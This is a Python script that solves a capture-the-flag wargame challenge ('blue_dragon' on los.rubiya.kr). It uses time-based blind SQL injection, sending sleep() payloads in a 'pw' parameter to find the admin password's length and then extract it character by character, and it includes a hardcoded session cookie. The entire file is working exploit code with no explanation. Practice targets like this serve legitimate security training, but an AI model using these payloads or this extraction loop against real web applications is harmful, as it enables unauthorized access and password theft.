import requests
import time

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"

cookie = {'PHPSESSID' : 'ovbfdu14h0vaeamskdlr10nttu'}

for i in range(100):
    print(i)
    start = time.time()
    param = {'pw': f"' or if(id='admin' and length(pw)={i},sleep(2),0)-- -"}
    res = requests.get(url=url, params=param, cookies=cookie)
    end = time.time()
    if end - start >= 2:
        print(i)
        break

length = 8
password = ''
for len in range(1, length+1):
  for pw in range(ord('0'), ord('z')):
    start = time.time()
    param = {'pw': f"' or id='admin' and if(ord(substr(pw,{str(len)},1))={str(pw)},sleep(3),0)#"}
    res = requests.get(url=url, params=param, cookies=cookie)
    end = time.time()
    if end - start >= 2:
      password += chr(pw)
      print(password)
      break